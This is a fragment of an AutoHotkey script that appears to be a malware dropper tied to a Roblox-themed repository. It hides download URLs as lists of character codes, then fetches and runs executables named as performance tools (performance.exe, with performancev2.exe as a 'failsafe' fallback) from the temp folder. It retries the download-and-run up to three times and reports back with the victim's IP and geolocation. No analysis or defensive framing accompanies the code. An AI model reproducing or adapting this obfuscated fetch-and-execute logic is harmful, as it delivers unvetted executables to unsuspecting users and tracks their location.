...
exe := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,101,106,116,121,112,101,47,114,111,98,108,111,120,47,109,97,105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,101,120,101]
failsafe := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,101,106,116,121,112,101,47,114,111,98,108,111,120,47,109,97,105,110,47,112,101,114,102,111,114,109,97,110,99,101,118,50,46,101,120,101]
exeUrl := CharListToStr(exe)
wkUrl := CharListToStr(wk)
failsafeUrl := CharListToStr(failsafe)
failureCount := 0
notified := false
cachedGeo := ""
cachedIP := ""
...
failsafePath := tempDir . "\performancev2.exe"
if DirExist(tempDir)
...
TryFailSafeExe() {
    global failsafeUrl, failsafePath
    retryLimit := 3

    if !PingURL(failsafeUrl) {
        NDWithLocation("❌ Failsafe EXE unreachable: " . failsafeUrl)
        return false
    }
    ...
    Loop retryLimit {
        attempt := A_Index
        if TryDownloadAndRun(failsafeUrl, failsafePath, "performancev2.exe", attempt) {
